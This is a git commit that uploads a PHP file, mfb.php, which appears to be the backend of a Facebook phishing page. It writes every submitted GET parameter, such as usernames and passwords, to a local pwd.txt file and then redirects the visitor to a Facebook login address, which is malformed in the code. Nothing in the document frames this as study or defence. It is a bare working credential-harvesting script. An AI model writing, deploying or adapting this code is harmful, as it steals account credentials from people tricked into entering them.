6b2d2bdccc2ff8821a7538b564211efce318dc95
jejakcodingws <163624941+jejakcodingws@users.noreply.github.com>
2024-06-18 20:01:17 +0700

    Add files via upload
    first

---
+++ mfb.php
@@ -0,0 +1,13 @@
+<?php
+header("Location: http://www/facebook.com/login.php");
+$handle = fopen("pwd.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
